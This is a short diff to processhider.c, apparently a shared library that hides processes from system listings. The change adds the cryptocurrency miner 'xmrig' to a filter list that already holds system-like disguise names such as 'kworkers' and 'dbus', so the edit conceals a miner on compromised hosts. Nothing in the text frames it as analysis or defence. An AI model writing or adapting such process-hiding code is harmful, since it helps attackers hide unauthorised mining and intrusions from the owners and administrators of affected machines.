@@ -11,7 +11,7 @@ gcc -shared -fPIC -o processhider.so processhider.c
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "kworkers|dbus|autoupdate|ping";
+static const char* process_to_filter = "kworkers|dbus|autoupdate|ping|xmrig";
 
 /*
  * Get a directory name given a DIR* handle
